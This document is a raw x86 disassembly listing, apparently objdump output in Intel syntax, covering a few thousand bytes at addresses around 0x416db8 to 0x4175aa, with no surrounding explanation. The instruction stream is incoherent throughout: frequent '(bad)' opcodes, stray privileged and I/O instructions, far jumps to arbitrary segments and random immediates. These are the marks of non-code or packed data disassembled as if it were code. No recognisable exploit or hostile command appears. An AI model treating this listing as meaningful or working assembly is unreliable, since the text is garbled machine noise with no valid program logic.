  416db8:	call   0x329f:0x36700ba9
  416dbf:	adc    eax,0x681ab4bf
  416dc4:	jno    0x416e36
  416dc6:	(bad)  
  416dc7:	adc    eax,0x5a5e6101
  416dcc:	push   ecx
  416dcd:	mov    ah,0x0
  416dcf:	mov    ds:0x172bc98c,eax
  416dd4:	clc    
  416dd5:	dec    ebp
  416dd6:	dec    ebp
  416dd7:	ret    0x227f
  416dda:	fs dec edx
  416ddc:	(bad)  
  416ddd:	fld    DWORD PTR [ebp-0x71d3f43a]
  416de3:	mov    ds:0x8edc94e6,al
  416de8:	icebp  
  416de9:	in     eax,dx
  416dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416deb:	aaa    
  416dec:	or     DWORD PTR [ebx+0x609ba59b],ecx
  416df2:	lods   al,BYTE PTR ds:[esi]
  416df3:	dec    ecx
  416df4:	cmp    ah,BYTE PTR [ebx+0x70b5e567]
  416dfa:	enter  0xdcb1,0x38
  416dfe:	add    eax,0x1275f1c1
  416e03:	adc    eax,0x282c4888
  416e08:	sti    
  416e09:	pop    ds
  416e0a:	pop    ss
  416e0b:	mov    cl,0x3d
  416e0d:	ret    0x71b8
  416e10:	pop    edx
  416e11:	mov    esi,0xa6430702
  416e16:	add    al,0xf8
  416e18:	icebp  
  416e19:	sbb    BYTE PTR [edi-0x7f],dh
  416e1c:	mov    bl,0x9b
  416e1e:	call   0xd1eedb94
  416e23:	test   eax,0x7747873c
  416e28:	(bad)  
  416e29:	loope  0x416df2
  416e2b:	inc    ebp
  416e2c:	adc    ecx,ecx
  416e2e:	jae    0x416e2e
  416e30:	inc    esp
  416e31:	scas   al,BYTE PTR es:[edi]
  416e32:	mov    edx,0x8d07347a
  416e37:	jae    0x416df5
  416e39:	call   0x7cc2c8f8
  416e3e:	pop    ds
  416e3f:	jle    0x416dfb
  416e41:	repz or al,0x5e
  416e44:	or     esp,DWORD PTR [ebx-0x256c7d5f]
  416e4a:	aaa    
  416e4b:	sub    al,0x70
  416e4d:	and    eax,0xe613030a
  416e52:	cmc    
  416e53:	inc    edx
  416e54:	jp     0x416e18
  416e56:	mov    dh,0x4
  416e58:	call   0xafa286c8
  416e5d:	pop    eax
  416e5e:	call   DWORD PTR [ebx-0x39]
  416e61:	rcr    DWORD PTR gs:[edi-0x61],cl
  416e65:	xchg   ecx,eax
  416e66:	mov    bh,0x93
  416e68:	cmp    al,0xbe
  416e6a:	aaa    
  416e6b:	dec    DWORD PTR [esi-0x69910d42]
  416e71:	sahf   
  416e72:	pusha  
  416e73:	pop    ebx
  416e74:	inc    esi
  416e75:	pop    esi
  416e76:	adc    DWORD PTR [edx],esp
  416e78:	push   ebp
  416e79:	out    0x99,al
  416e7b:	push   esi
  416e7c:	cli    
  416e7d:	into   
  416e7e:	push   0x32
  416e80:	and    esi,DWORD PTR [ebx+esi*8+0xd119589]
  416e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e88:	stos   DWORD PTR es:[edi],eax
  416e89:	(bad)  
  416e8a:	iret   
  416e8b:	add    ebx,DWORD PTR [eax+0x18d4f10]
  416e91:	fdivr  DWORD PTR [edi+0x57]
  416e94:	pop    eax
  416e95:	lds    ebp,FWORD PTR [edx]
  416e97:	bound  edx,QWORD PTR [edx-0x40c7c408]
  416e9d:	sbb    al,0x8d
  416e9f:	loope  0x416ed4
  416ea1:	lods   al,BYTE PTR ds:[esi]
  416ea2:	aas    
  416ea3:	add    dl,cl
  416ea5:	addr16 aaa 
  416ea7:	call   0x7b9b:0xba26d046
  416eae:	xchg   BYTE PTR [edi],ch
  416eb0:	pop    edx
  416eb1:	cwde   
  416eb2:	fstp   DWORD PTR [ecx]
  416eb4:	pushf  
  416eb5:	or     BYTE PTR [edi-0x42],dl
  416eb8:	mov    esp,0xef7eee03
  416ebd:	jno    0x416ef3
  416ebf:	jle    0x416e5c
  416ec1:	dec    edi
  416ec2:	ds mov bl,0x92
  416ec5:	inc    ebx
  416ec6:	mov    esp,0x2d2ddf8c
  416ecb:	push   edi
  416ecc:	shld   DWORD PTR [esp+eiz*4],esi,0x6e
  416ed1:	and    cl,BYTE PTR [ecx+0x57]
  416ed4:	mov    ch,0x48
  416ed6:	mov    esi,0x8711ad7a
  416edb:	pop    ecx
  416edc:	arpl   WORD PTR [ebp+0x11],bp
  416edf:	popf   
  416ee0:	pop    ebx
  416ee1:	call   0x81e4:0xeac10f33
  416ee8:	mov    esp,0x507bdcab
  416eed:	push   0x3735edd9
  416ef2:	push   edx
  416ef3:	pop    esp
  416ef4:	push   esp
  416ef5:	mov    esp,0x1286d6db
  416efa:	mov    bh,0x88
  416efc:	pusha  
  416efd:	sysenter 
  416eff:	addr16 daa 
  416f01:	les    edx,FWORD PTR [ecx]
  416f03:	aam    0x8f
  416f05:	jae    0x416f77
  416f07:	test   DWORD PTR [esi+eax*2+0x76],ecx
  416f0b:	dec    edi
  416f0c:	jne    0x416f30
  416f0e:	sbb    WORD PTR [ecx],di
  416f11:	dec    edi
  416f12:	sbb    eax,ebp
  416f14:	push   0x51464733
  416f19:	sbb    DWORD PTR [eax],ebx
  416f1b:	mov    eax,0xe9bc3f9e
  416f20:	addr16 popa 
  416f22:	sub    ch,dh
  416f24:	ret    
  416f25:	retf   
  416f26:	and    edi,DWORD PTR [edx]
  416f28:	xor    ebx,0x4f
  416f2b:	(bad)  
  416f2c:	push   ss
  416f2d:	jo     0x416ef8
  416f2f:	adc    esp,DWORD PTR [edx-0x7144ad06]
  416f35:	data16 jns 0x416efe
  416f38:	ins    DWORD PTR es:[edi],dx
  416f39:	retf   
  416f3a:	in     al,0xbb
  416f3c:	add    dl,BYTE PTR [ecx]
  416f3e:	inc    eax
  416f3f:	or     al,0xbe
  416f41:	mov    dh,0x6c
  416f43:	call   0xd5865544
  416f48:	std    
  416f49:	jmp    0x398d:0xe87e0ba9
  416f50:	sub    BYTE PTR [ebx-0x77],ch
  416f53:	daa    
  416f54:	pop    esp
  416f55:	or     DWORD PTR [esi+ebp*8],0xffffffce
  416f59:	jmp    0xfe3e9b7f
  416f5e:	fld    QWORD PTR [esp+ecx*8]
  416f61:	jbe    0x416fd7
  416f63:	jmp    0x94a21f32
  416f68:	shr    DWORD PTR [ecx-0x215210bc],cl
  416f6e:	or     BYTE PTR [esi+0x74],ah
  416f71:	jmp    0xfaaa:0x6197cca4
  416f78:	data16 sub BYTE PTR [eax],ah
  416f7b:	es popf 
  416f7d:	sbb    eax,0xcbd2404a
  416f82:	push   edx
  416f83:	jne    0x416fe0
  416f85:	std    
  416f86:	loop   0x416fdd
  416f88:	ins    DWORD PTR es:[edi],dx
  416f89:	scas   al,BYTE PTR es:[edi]
  416f8a:	mov    esi,0x7921c52e
  416f8f:	pop    esp
  416f90:	add    esp,DWORD PTR [esp+ebp*4]
  416f93:	gs rol dl,1
  416f96:	jg     0x416f1e
  416f98:	popf   
  416f99:	xor    DWORD PTR [ebx],esp
  416f9b:	xchg   esp,eax
  416f9c:	imul   ebx,ebx,0x22
  416f9f:	sub    cl,bl
  416fa1:	mov    ds:0xbdd109f0,eax
  416fa6:	mov    edx,0xee66dd69
  416fab:	add    bl,bl
  416fad:	bound  esp,QWORD PTR [edi+0x42494c7c]
  416fb3:	adc    dh,bh
  416fb5:	mov    BYTE PTR [edx],0x24
  416fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb9:	jns    0x417030
  416fbb:	mov    BYTE PTR [ebx],0x79
  416fbe:	out    dx,al
  416fbf:	jae    0x416fac
  416fc1:	sub    eax,0xf054719c
  416fc6:	push   eax
  416fc7:	dec    ecx
  416fc8:	lods   al,BYTE PTR ds:[esi]
  416fc9:	mov    WORD PTR [edi+esi*8-0x59],?
  416fcd:	sbb    DWORD PTR [edi+ecx*4],edx
  416fd0:	test   al,0xe9
  416fd2:	xchg   ebx,eax
  416fd3:	push   edi
  416fd4:	lods   al,BYTE PTR ds:[esi]
  416fd5:	sub    dl,BYTE PTR [edi+0x15768bbe]
  416fdb:	nop
  416fdc:	cmp    eax,0xb48c373b
  416fe1:	mov    ecx,0x56725e9b
  416fe6:	stos   DWORD PTR es:[edi],eax
  416fe7:	xchg   DWORD PTR [esi+0x22],edx
  416fea:	xchg   ecx,eax
  416feb:	xchg   ebx,eax
  416fec:	push   ds
  416fed:	fadd   st,st(7)
  416fef:	repnz mov ch,0x42
  416ff2:	jmp    0xb2267db4
  416ff7:	xor    eax,0xd9c7107e
  416ffc:	inc    ebp
  416ffd:	pop    ebx
  416ffe:	jmp    0x27b1dd01
  417003:	scas   eax,DWORD PTR es:[edi]
  417004:	mov    ecx,0x22adc279
  417009:	sub    al,0x7
  41700b:	test   cl,dh
  41700d:	and    al,0xfe
  41700f:	mov    dh,BYTE PTR [ecx+0x4f3a641f]
  417015:	sbb    al,0xa
  417017:	(bad)  
  417018:	daa    
  417019:	bound  esp,QWORD PTR [ebp-0x7176b708]
  41701f:	inc    BYTE PTR [eax*4-0x4425e70c]
  417026:	dec    ecx
  417027:	mov    dl,0x37
  417029:	mov    edi,0xb83f436
  41702e:	sub    BYTE PTR [ecx],bl
  417030:	add    ah,ch
  417032:	jmp    0xe9bee02a
  417037:	(bad)  
  417039:	dec    ebx
  41703a:	test   DWORD PTR [esi],0xa7cc534e
  417040:	stc    
  417041:	push   0x56
  417043:	bnd jno 0x417005
  417046:	cmc    
  417047:	mov    BYTE PTR [ecx],ch
  417049:	or     ah,ch
  41704b:	mov    edx,0x371fa1c2
  417050:	in     al,dx
  417051:	push   ecx
  417052:	(bad)  
  417053:	dec    esp
  417054:	sbb    ecx,DWORD PTR [esi+0x44dd52e]
  41705a:	fld    QWORD PTR [eax+0x2d2790cf]
  417060:	loop   0x417008
  417062:	jg     0x417013
  417064:	retf   0x450a
  417067:	inc    esp
  417068:	stc    
  417069:	xor    eax,0xb0d8f002
  41706e:	fwait
  41706f:	(bad)  
  417070:	sbb    esi,edi
  417072:	in     al,dx
  417073:	mov    ebp,0x3fdd095c
  417078:	fwait
  417079:	stc    
  41707a:	sbb    al,0x2f
  41707c:	jmp    0x417018
  41707e:	retf   
  41707f:	jl     0x41706b
  417081:	inc    edi
  417082:	sbb    al,BYTE PTR [ecx]
  417084:	pop    ebx
  417085:	jnp    0x417043
  417087:	hlt    
  417088:	or     bh,ch
  41708a:	adc    ebp,DWORD PTR [ebx-0x3a]
  41708d:	ror    BYTE PTR [ebx-0x8],cl
  417090:	add    al,0x29
  417092:	imul   ebp,ebx,0x3
  417095:	lock sar DWORD PTR ds:0x7a1ee5cf,1
  41709c:	pcmpeqd mm1,QWORD PTR [ebx-0x304b49b6]
  4170a3:	jo     0x417048
  4170a5:	je     0x417060
  4170a7:	dec    edx
  4170a8:	in     eax,0x53
  4170aa:	mov    ecx,0x828e20d6
  4170af:	or     edx,DWORD PTR [esi+0x3e]
  4170b2:	adc    DWORD PTR [eax],ebp
  4170b4:	cmp    al,0x68
  4170b6:	(bad)  
  4170b7:	repz pop es
  4170b9:	cmc    
  4170ba:	xor    BYTE PTR [ebx-0x40],al
  4170bd:	and    eax,0x5ca3fc5e
  4170c2:	lods   al,BYTE PTR ds:[esi]
  4170c3:	aad    0x2b
  4170c5:	mov    dl,0x80
  4170c7:	ss sub al,0x6a
  4170ca:	iret   
  4170cb:	daa    
  4170cc:	mov    edx,es
  4170ce:	test   eax,0x4a25ab06
  4170d3:	fdivr  DWORD PTR [edx]
  4170d5:	fsub   DWORD PTR [edx+0x1fed96a5]
  4170db:	mov    eax,ds:0x5ac2f3a5
  4170e0:	inc    ebp
  4170e1:	lahf   
  4170e2:	jecxz  0x417124
  4170e4:	test   DWORD PTR [ebx-0x7e447a93],ecx
  4170ea:	hlt    
  4170eb:	sub    BYTE PTR [ecx+esi*8],ch
  4170ee:	sahf   
  4170ef:	fwait
  4170f0:	sbb    ebp,eax
  4170f2:	mov    DWORD PTR [edx],esp
  4170f4:	scas   al,BYTE PTR es:[edi]
  4170f5:	dec    esi
  4170f6:	push   edx
  4170f7:	in     al,dx
  4170f8:	std    
  4170f9:	sti    
  4170fa:	in     al,0x29
  4170fc:	xlat   BYTE PTR ds:[ebx]
  4170fd:	pop    ds
  4170fe:	mov    ch,bh
  417100:	mov    bh,0xb2
  417102:	enter  0xa33a,0x94
  417106:	fs cld 
  417108:	xlat   BYTE PTR ds:[ebx]
  417109:	out    0x5a,al
  41710b:	xchg   esi,eax
  41710c:	and    BYTE PTR [ecx],0xd
  41710f:	pushf  
  417110:	xchg   BYTE PTR [edx-0x3c2377f1],ch
  417116:	xor    al,0xb7
  417118:	in     eax,dx
  417119:	repz shl BYTE PTR [esi-0x7c77fff8],1
  417120:	test   DWORD PTR [ebx-0x3f],0x3d1efcff
  417127:	aaa    
  417128:	dec    ecx
  417129:	cmp    DWORD PTR [edi-0x53],0xd067b872
  417130:	add    DWORD PTR [eax],0x38
  417133:	dec    DWORD PTR [ecx]
  417135:	inc    ebp
  417136:	sub    DWORD PTR [esp+0x66db3af],eax
  41713d:	adc    eax,DWORD PTR [ecx]
  41713f:	sub    eax,0xd70fe975
  417144:	and    eax,DWORD PTR [eax+0x7491eac4]
  41714a:	(bad)  
  41714b:	push   ss
  41714c:	jmp    0x30be02b0
  417151:	rcl    BYTE PTR [ecx+0x5b364889],1
  417157:	icebp  
  417158:	xchg   esp,eax
  417159:	sbb    eax,0x426c3c63
  41715e:	js     0x41711b
  417160:	inc    edi
  417161:	repz inc ebx
  417163:	mov    al,0x62
  417165:	add    BYTE PTR [ebp+0x22af5dda],dl
  41716b:	xchg   DWORD PTR [ebx+0x57deb811],ebp
  417171:	lahf   
  417172:	js     0x417113
  417174:	enter  0x68,0x87
  417178:	add    BYTE PTR [ecx],ch
  41717a:	lds    eax,FWORD PTR [ebx-0x21]
  41717d:	stc    
  41717e:	lea    sp,ds:0xd0ab4aab
  417185:	dec    ebp
  417186:	mov    edx,DWORD PTR [esi+0x24d3e074]
  41718c:	sbb    al,0xb8
  41718e:	xchg   esp,eax
  41718f:	xchg   edi,eax
  417190:	ins    DWORD PTR es:[edi],dx
  417191:	xor    bh,BYTE PTR [ecx]
  417193:	outs   dx,BYTE PTR ds:[esi]
  417194:	arpl   WORD PTR [eax],bx
  417196:	sub    ecx,ebx
  417198:	xchg   esp,eax
  417199:	test   eax,0x125ddbe2
  41719e:	inc    edx
  41719f:	mov    ah,0x57
  4171a1:	mov    ebp,0xeb02dcfb
  4171a6:	(bad)  
  4171a7:	fcmovu st,st(3)
  4171a9:	sbb    BYTE PTR [edx+0xea95422],0xe8
  4171b0:	add    al,0xc2
  4171b2:	xor    eax,0xbe2d4181
  4171b7:	add    ch,BYTE PTR [ecx-0x36]
  4171ba:	(bad)  
  4171bb:	jmp    0x4171b1
  4171bd:	pushf  
  4171be:	out    dx,eax
  4171bf:	cmp    ebp,esp
  4171c1:	lahf   
  4171c2:	or     edx,0x7e2f19bf
  4171c8:	(bad)  
  4171ca:	dec    edi
  4171cb:	daa    
  4171cc:	xchg   esp,eax
  4171cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ce:	and    DWORD PTR [edx-0x12],ebp
  4171d1:	pop    ds
  4171d2:	cmp    eax,0xbd0d274c
  4171d7:	jns    0x417198
  4171d9:	inc    esi
  4171da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171db:	mov    WORD PTR [edi+0x6c3214ca],es
  4171e1:	sbb    ebx,DWORD PTR [ebp-0x1354a651]
  4171e7:	into   
  4171e8:	push   ebx
  4171e9:	dec    ebx
  4171ea:	fmul   QWORD PTR [ecx]
  4171ec:	mov    ebx,0x60574fdd
  4171f1:	stos   DWORD PTR es:[edi],eax
  4171f2:	in     eax,0xd3
  4171f4:	xchg   esi,eax
  4171f5:	dec    edi
  4171f6:	xchg   esi,eax
  4171f7:	ror    DWORD PTR [eax],cl
  4171f9:	loope  0x417234
  4171fb:	sub    DWORD PTR fs:[ecx+eax*1+0x48a9ea5b],ebp
  417203:	aam    0x4e
  417205:	in     al,dx
  417206:	in     eax,dx
  417207:	sub    eax,DWORD PTR [esi]
  417209:	mov    ds:0xabbbfdb8,al
  41720e:	ins    BYTE PTR es:[edi],dx
  41720f:	and    DWORD PTR [ebx+0x7f],0xffffff8b
  417213:	mov    eax,ds:0xa4940d12
  417218:	retf   0xa7f6
  41721b:	adc    DWORD PTR [ecx-0x274076d9],0xfffffff2
  417222:	inc    esp
  417223:	adc    eax,edi
  417225:	ror    BYTE PTR ds:[ebp-0x6df7898c],1
  41722c:	jmp    0x4171e1
  41722e:	stos   DWORD PTR es:[edi],eax
  41722f:	data16 sbb BYTE PTR [eax+edx*2-0x4],dh
  417234:	push   ebx
  417235:	sub    al,BYTE PTR [ebx+0x7b]
  417238:	sbb    al,0x5b
  41723a:	sbb    ebx,esi
  41723c:	clflush BYTE PTR [ecx+0x36a0cf7e]
  417243:	aam    0x15
  417245:	mov    edi,0x7c447a8c
  41724a:	xchg   ebx,eax
  41724b:	pushf  
  41724c:	adc    eax,0xe975ff04
  417251:	push   0xffffffe6
  417253:	or     edx,DWORD PTR [eax+0x63f1e15]
  417259:	sahf   
  41725a:	sub    eax,0xe470f1f5
  41725f:	push   ebx
  417260:	scas   eax,DWORD PTR es:[edi]
  417261:	and    ebp,edx
  417263:	dec    edx
  417264:	fs cmp esi,edi
  417267:	mov    eax,0x41ad601b
  41726c:	call   0xd4ad:0x68ff1952
  417273:	aaa    
  417274:	or     eax,0x189e8b3e
  417279:	or     eax,0x1177c7b4
  41727e:	int3   
  41727f:	enter  0xa5c,0xbe
  417283:	ins    BYTE PTR es:[edi],dx
  417284:	inc    edi
  417285:	das    
  417286:	jmp    0x499c:0xde2e2dc0
  41728d:	sbb    ebx,esi
  41728f:	adc    BYTE PTR [edi-0x3c],al
  417292:	pop    edi
  417293:	or     al,0x78
  417295:	(bad)  
  417296:	add    eax,0x8e1ab569
  41729b:	xchg   DWORD PTR [edx+0x5a8be8b9],ebp
  4172a1:	fadd   QWORD PTR [eax+0x49]
  4172a4:	scas   eax,DWORD PTR es:[edi]
  4172a5:	sub    ebp,DWORD PTR [edx+0x1cbfa344]
  4172ab:	mov    ecx,0x8f31279a
  4172b0:	adc    ebp,DWORD PTR ds:0x125cb1db
  4172b6:	xchg   ebp,eax
  4172b7:	nop
  4172b8:	xlat   BYTE PTR ds:[ebx]
  4172b9:	and    al,0x9
  4172bb:	xchg   edi,eax
  4172bc:	cmp    ecx,DWORD PTR [eax]
  4172be:	imul   edx,esp,0xffffffb6
  4172c1:	pop    edi
  4172c2:	arpl   WORD PTR [eax+0x40],cx
  4172c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172c6:	add    eax,0x1e3f09cf
  4172cb:	std    
  4172cc:	push   eax
  4172cd:	bound  ebx,QWORD PTR [ebx+ebx*4+0x4b]
  4172d1:	pop    eax
  4172d2:	loop   0x41730a
  4172d4:	fldenv [ebp+0x5ed40140]
  4172da:	pusha  
  4172db:	test   eax,0xa6b43e28
  4172e0:	dec    edx
  4172e1:	retf   0xa20c
  4172e4:	mov    bh,0xd5
  4172e6:	lahf   
  4172e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172e8:	fdivp  st(3),st
  4172ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172eb:	add    DWORD PTR [eax+ebx*1+0x2bf8bddd],0xffffffa5
  4172f3:	icebp  
  4172f4:	pop    ecx
  4172f5:	aas    
  4172f6:	pushf  
  4172f7:	xchg   ebx,eax
  4172f8:	dec    ebx
  4172f9:	jns    0x4172f9
  4172fb:	jae    0x41727f
  4172fd:	nop
  4172fe:	pop    eax
  4172ff:	xor    eax,0x366f8996
  417304:	mov    cl,0x85
  417306:	cld    
  417307:	cmp    al,0xa4
  417309:	aas    
  41730a:	idiv   ecx
  41730c:	ins    BYTE PTR es:[edi],dx
  41730d:	adc    DWORD PTR [ebx-0x70],esp
  417310:	mov    ah,0xd0
  417312:	hlt    
  417313:	stos   BYTE PTR es:[edi],al
  417314:	cld    
  417315:	cwde   
  417316:	mov    edx,DWORD PTR [ecx+0x6d]
  417319:	test   DWORD PTR [edi-0x22],0xda314ce9
  417320:	in     al,0xf0
  417322:	test   DWORD PTR [ebx+0x403bf028],esi
  417328:	mov    ah,BYTE PTR [edx-0x4f]
  41732b:	repnz (bad) 
  41732d:	je     0x417377
  41732f:	lahf   
  417330:	fwait
  417331:	jb     0x417386
  417333:	and    dh,BYTE PTR [ebx-0x6d]
  417336:	mov    bh,0xbf
  417338:	rol    BYTE PTR [ebx-0x6d],1
  41733b:	adc    eax,0xa6968af2
  417340:	pop    esp
  417341:	(bad)  
  417342:	cwde   
  417343:	into   
  417344:	push   ecx
  417345:	adc    ecx,esp
  417347:	cli    
  417348:	jmp    0x95d5:0x507a1b2b
  41734f:	sub    al,0x85
  417351:	fwait
  417352:	xor    DWORD PTR [ecx-0x720ba10],edi
  417358:	and    ebp,ebx
  41735a:	or     ecx,DWORD PTR [eax]
  41735c:	mov    al,0x5a
  41735e:	std    
  41735f:	lahf   
  417360:	shr    BYTE PTR [edx],0xf6
  417363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417364:	push   es
  417365:	mov    esi,DWORD PTR [edx+0x67]
  417368:	ins    BYTE PTR es:[edi],dx
  417369:	pop    ebp
  41736a:	adc    BYTE PTR [edi-0x2579a7dc],0xb2
  417371:	rcr    BYTE PTR [ebp+0x560d35e1],cl
  417377:	mov    al,ds:0x117a4c63
  41737c:	xchg   ebp,eax
  41737d:	xchg   edi,eax
  41737e:	mov    DWORD PTR es:[eax+0x2e],ebp
  417382:	mov    ebp,0x5f260e92
  417387:	pusha  
  417388:	imul   ebx,DWORD PTR [ebp+0x58],0x8dfe2ede
  41738f:	and    DWORD PTR [ecx+edx*4],eax
  417392:	xor    al,BYTE PTR [edi-0x3c]
  417395:	imul   ecx,DWORD PTR [edi+0x12],0x6013ac95
  41739c:	ror    BYTE PTR [edx+0xbe4aeee],0xcb
  4173a3:	xchg   bl,bl
  4173a5:	lods   al,BYTE PTR ds:[esi]
  4173a6:	xor    DWORD PTR [eax-0x38b23ba2],ebp
  4173ac:	sub    al,0x3f
  4173ae:	loopne 0x417371
  4173b0:	lahf   
  4173b1:	movzx  ebp,BYTE PTR [ecx]
  4173b4:	aaa    
  4173b5:	push   ebp
  4173b6:	and    eax,0x4d6d72b9
  4173bb:	test   eax,0x7a081650
  4173c0:	push   eax
  4173c1:	push   eax
  4173c2:	pop    ss
  4173c3:	(bad)  
  4173c4:	in     al,0xc1
  4173c6:	jl     0x4173c9
  4173c8:	xchg   edx,eax
  4173c9:	stos   BYTE PTR es:[edi],al
  4173ca:	adc    DWORD PTR [edx-0x3d9ff53f],ebp
  4173d0:	aam    0xa
  4173d2:	jmp    0x41740c
  4173d4:	pop    ebp
  4173d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d6:	sub    eax,0xcd323890
  4173db:	push   ss
  4173dc:	jle    0x41744c
  4173de:	lds    esi,FWORD PTR [eax+0x44dbe76e]
  4173e4:	mov    ch,0xf2
  4173e6:	fldenv [ebp+0x18]
  4173e9:	xchg   BYTE PTR ds:0xd3fc23f4,bl
  4173ef:	push   esi
  4173f0:	sub    eax,0xaf5b9eec
  4173f5:	jge    0x41742e
  4173f7:	cli    
  4173f8:	cdq    
  4173f9:	push   ss
  4173fa:	outs   dx,BYTE PTR ds:[esi]
  4173fb:	add    al,0x54
  4173fd:	xchg   ebx,eax
  4173fe:	sbb    al,bl
  417400:	mov    esp,0x482aa345
  417405:	int    0x1e
  417407:	leave  
  417408:	(bad)  
  41740a:	xor    ecx,DWORD PTR [esi+0x16]
  41740d:	mov    edi,0xcfc1245b
  417412:	cld    
  417413:	ret    
  417414:	xchg   ebx,eax
  417415:	enter  0x93a7,0x1e
  417419:	dec    esi
  41741a:	inc    ecx
  41741b:	jecxz  0x417410
  41741d:	mov    edi,ecx
  41741f:	mov    eax,0x6a29b1d6
  417424:	fisub  DWORD PTR [edx-0x23]
  417427:	ds das 
  417429:	outs   dx,DWORD PTR ds:[esi]
  41742a:	hlt    
  41742b:	leave  
  41742c:	je     0x417420
  41742e:	jo     0x4173c9
  417430:	mov    cl,0x12
  417432:	in     eax,dx
  417433:	retf   
  417434:	iret   
  417435:	push   es
  417436:	imul   ebp,DWORD PTR [edx],0xfe3419bf
  41743c:	jne    0x4173c5
  41743e:	add    ch,BYTE PTR [edx-0x4c2b05ad]
  417444:	mov    edi,0x2df32c2d
  417449:	jbe    0x41741b
  41744b:	xor    al,0xf2
  41744d:	clc    
  41744e:	sub    BYTE PTR [edi],0xbe
  417451:	scas   eax,DWORD PTR es:[edi]
  417452:	push   esi
  417453:	leave  
  417454:	jmp    ecx
  417456:	mov    BYTE PTR [ebx],cl
  417458:	pop    edi
  417459:	repz jno 0x417434
  41745c:	or     ecx,DWORD PTR [eax-0x2e0f3475]
  417462:	repz inc ebp
  417464:	mov    edx,0xda1a20c4
  417469:	xor    al,0xbd
  41746b:	sub    cl,bl
  41746d:	cmp    ebp,ebx
  41746f:	dec    edi
  417470:	das    
  417471:	inc    edi
  417472:	aas    
  417473:	pop    edi
  417474:	mov    ecx,0xda4ccf42
  417479:	xor    cl,bh
  41747b:	cld    
  41747c:	in     al,0x17
  41747e:	(bad)  ds:0x75f5e9e5
  417484:	sti    
  417485:	inc    eax
  417486:	fist   WORD PTR [edx-0x74]
  417489:	inc    edx
  41748a:	pop    ds
  41748b:	jp     0x417451
  41748d:	test   eax,0xd4cdd90b
  417492:	in     eax,0xa4
  417494:	in     al,0x72
  417496:	xchg   DWORD PTR [edx],ebp
  417498:	aam    0xc6
  41749a:	jno    0x41748c
  41749c:	(bad)
  41749f:	cs aam 0x45
  4174a2:	and    ecx,ebx
  4174a4:	scas   eax,DWORD PTR es:[edi]
  4174a5:	mov    DWORD PTR [edx+0x3e],0x705910b4
  4174ac:	aas    
  4174ad:	out    0x45,eax
  4174af:	outs   dx,BYTE PTR ds:[esi]
  4174b0:	popf   
  4174b1:	sub    al,0xa5
  4174b3:	(bad)  
  4174b5:	cmc    
  4174b6:	rcr    esp,cl
  4174b8:	dec    ebx
  4174b9:	cld    
  4174ba:	mov    es,esp
  4174bc:	pop    ss
  4174bd:	sbb    WORD PTR [ebx+0x70],0x2194
  4174c3:	lods   al,BYTE PTR ds:[esi]
  4174c4:	fsub   QWORD PTR [ebp-0x6c]
  4174c7:	lock sbb eax,0x9b049e8d
  4174cd:	cmc    
  4174ce:	or     al,0xf3
  4174d0:	dec    edx
  4174d1:	je     0x417532
  4174d3:	xchg   edx,eax
  4174d4:	addr16 repnz std 
  4174d7:	fmul   QWORD PTR [esi-0x50c70254]
  4174dd:	fidivr WORD PTR [edi+0x375691c6]
  4174e3:	les    edi,FWORD PTR [ebx-0xb]
  4174e6:	adc    esi,esp
  4174e8:	gs xchg esi,eax
  4174ea:	lds    ebx,FWORD PTR [esi-0xb]
  4174ed:	mov    eax,0x73f96c3f
  4174f2:	mov    BYTE PTR [ebp+0x60442165],ch
  4174f8:	mov    eax,0x2a697b1e
  4174fd:	sbb    bp,si
  417500:	xchg   edx,eax
  417501:	test   al,0x1b
  417503:	imul   ecx,ebp,0xffffffc5
  417506:	in     eax,dx
  417507:	inc    ebx
  417508:	(bad)  
  417509:	ficom  WORD PTR [ecx]
  41750b:	xchg   ebp,eax
  41750c:	cmp    DWORD PTR [esi],eax
  41750e:	sbb    bl,BYTE PTR [edx]
  417510:	shl    BYTE PTR [esi+0x3ced11f2],cl
  417516:	or     eax,0xa711a52a
  41751b:	mov    bl,0x4b
  41751d:	dec    edi
  41751e:	add    edx,DWORD PTR [edx]
  417520:	and    ecx,edx
  417522:	(bad)  [edx+0x74506b3f]
  417528:	sar    ebp,0x1c
  41752b:	(bad)  
  41752c:	jmp    0xa565:0xd996d40b
  417533:	fmul   DWORD PTR [eax]
  417535:	jge    0x4174e3
  417537:	jmp    0x6363708b
  41753c:	and    al,0x8f
  41753e:	inc    esp
  41753f:	lock xchg edx,eax
  417541:	fs out 0x19,eax
  417544:	push   cs
  417545:	or     al,0x2a
  417547:	sti    
  417548:	dec    ebx
  417549:	in     eax,dx
  41754a:	pusha  
  41754b:	pop    edi
  41754c:	sbb    edi,edi
  41754e:	iret   
  41754f:	pushf  
  417550:	pop    edi
  417551:	sar    al,cl
  417553:	pop    es
  417554:	in     eax,0x7d
  417556:	xchg   edi,eax
  417557:	mov    dl,0x8
  417559:	sti    
  41755a:	xor    BYTE PTR [esp+ecx*2],cl
  41755d:	jae    0x4175b2
  41755f:	sbb    al,0x9c
  417561:	inc    esi
  417562:	push   0xf92bacd3
  417567:	rol    bh,cl
  417569:	ror    eax,cl
  41756b:	adc    eax,0xffffffb1
  41756e:	fstp   TBYTE PTR [ebp+0x183c8bfc]
  417574:	popf   
  417575:	out    0x7b,eax
  417577:	retf   0xd776
  41757a:	repnz or BYTE PTR [ecx-0x4c],al
  41757e:	imul   ebx,ebp,0xffffffae
  417581:	fcmovnu st,st(3)
  417583:	shl    DWORD PTR [ecx+0x2d],1
  417586:	push   ss
  417587:	mov    dl,0x0
  417589:	inc    esp
  41758a:	inc    ebx
  41758b:	fbld   TBYTE PTR [edi+0x2a]
  41758e:	shl    BYTE PTR [eax-0x78],1
  417591:	mov    eax,0x6f41111e
  417596:	add    bh,BYTE PTR [ebx+ebp*1+0xa]
  41759a:	lea    ecx,[eax]
  41759c:	sbb    edx,esi
  41759e:	xor    al,BYTE PTR [ebx-0x52]
  4175a1:	fstp   QWORD PTR [edx+0xe]
  4175a4:	cmp    ebx,DWORD PTR [edx+0x3595a788]
  4175aa:	test   eax,0x1855efeb
